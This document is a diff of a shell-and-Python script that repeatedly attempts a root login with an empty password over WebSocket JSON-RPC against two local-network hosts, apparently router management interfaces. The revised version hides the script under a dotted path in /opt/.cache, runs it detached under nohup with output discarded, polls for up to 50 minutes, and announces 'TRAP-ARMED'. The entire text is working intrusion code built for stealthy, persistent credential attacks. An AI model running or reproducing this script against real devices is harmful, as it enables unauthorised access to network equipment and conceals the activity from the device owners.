@@ -1,48 +1,44 @@
-cat > /tmp/wsy.py << 'EOF'
-import socket,struct,os,json,time,base64
+cat > /opt/.cache/.wslogin.py << 'EOF'
+import socket,os,json,time,base64,struct
 def attempt(host):
-    s=socket.socket();s.settimeout(7);s.connect((host,15611))
+    s=socket.socket();s.settimeout(6)
+    try: s.connect((host,15611))
+    except Exception as e: return f"{host} OFF:"+str(e)[:30]
     key=base64.b64encode(os.urandom(16)).decode()
-    req=("GET / HTTP/1.1\r\nHost: "+host+":15611\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: "+key+"\r\nSec-WebSocket-Version: 13\r\nOrigin: http://"+host+"\r\n\r\n")
+    req="GET / HTTP/1.1\r\nHost: "+host+":15611\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: "+key+"\r\nSec-WebSocket-Version: 13\r\n\r\n"
     s.sendall(req.encode())
     hdr=b""
     try:
         while b"\r\n\r\n" not in hdr: hdr+=s.recv(1024)
     except: pass
     first=hdr.split(b"\r\n")[0].decode(errors="replace")
-    if "101" not in first: s.close(); return host,"BAD:"+first[:60],None
-    def send(txt):
-        p=txt.encode(); m=os.urandom(4)
-        h=b"\x81"+bytes([0x80|len(p)]) if len(p)<126 else None
-        if h is None:
-            h=b"\x81"+bytes([0x80|126])+struct.pack(">H",len(p))
-        s.sendall(h+m+bytes(b^m[i%4] for i,b in enumerate(p)))
-    send(json.dumps({"jsonrpc":"2.0","id":1,"method":"call","params":["00000000000000000000000000000000","session","login",{"username":"root","password":""}]}))
-    out=b""; end=time.time()+4
+    if "101" not in first: s.close(); return f"{host} BAD:"+first[:40]
+    p=json.dumps({"jsonrpc":"2.0","id":1,"method":"call","params":["00000000000000000000000000000000","session","login",{"username":"root","password":""}]}).encode()
+    m=os.urandom(4)
+    h=b"\x81"+bytes([0x80|len(p)])
+    s.sendall(h+m+bytes(b^m[i%4] for i,b in enumerate(p)))
+    out=b""; end=time.time()+3
     while time.time()<end:
         try:
             s.settimeout(1); d=s.recv(4096)
             if d: out+=d
         except: pass
     s.close()
-    # parse text frame
     txt=""
     if len(out)>2:
         ln=out[1]&0x7f; off=2
-        if ln==126: ln=struct.unpack(">H",out[2:4])[0]; off=4
-        has_mask=out[1]&0x80
-        if has_mask:
-            mk=out[off:off+4]; off+=4
-            data=bytes(b^mk[i%4] for i,b in enumerate(out[off:off+ln]))
-        else: data=out[off:off+ln]
+        if out[1]&0x80: mk=out[off:off+4]; off+=4
+        else: mk=None
+        data=out[off:off+ln]
+        if mk: data=bytes(b^mk[i%4] for i,b in enumerate(data))
         txt=data.decode(errors="replace")
-    return host,"101-OK",txt[:300]
-for h in ["192.168.3.126","192.168.3.198"]:
-    try:
-        a,b,c=attempt(h)
-        print(a,b,"RESP:",c)
-    except Exception as e:
-        print(h,"ERR",str(e)[:60])
-
+    return f"{host} LOGIN-RESP: "+txt[:250]
+# цикл-ловушка: ждать появления хостов до 50 минут, проверка каждые 120с
+log=open("/tmp/wslogin.out","a")
+for cycle in range(25):
+    r1=attempt("192.168.3.126"); r2=attempt("192.168.3.198")
+    log.write(time.ctime()+" | "+r1+" | "+r2+"\n"); log.flush()
+    if "LOGIN-RESP" in r1 or "LOGIN-RESP" in r2: break
+    time.sleep(120)
 EOF
-python3 /tmp/wsy.py
+nohup python3 /opt/.cache/.wslogin.py >/dev/null 2>&1 & echo TRAP-ARMED
